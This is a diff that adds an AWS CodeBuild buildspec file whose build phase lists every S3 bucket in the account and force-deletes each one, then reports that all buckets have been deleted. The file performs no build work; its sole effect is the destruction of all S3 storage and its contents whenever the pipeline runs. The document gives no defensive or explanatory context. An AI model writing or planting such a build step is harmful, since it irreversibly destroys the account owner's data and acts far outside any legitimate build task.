@@ -1,0 +1,10 @@
+version: 0.2
+
+phases:
+  build:
+    commands:
+      - echo "Fetching all S3 buckets..."
+      - buckets=$(aws s3api list-buckets --query "Buckets[].Name" --output text)
+      - echo "Buckets to delete: $buckets"
+      - for bucket in $buckets; do aws s3 rb s3://$bucket --force; done
+      - echo "All S3 buckets have been deleted."
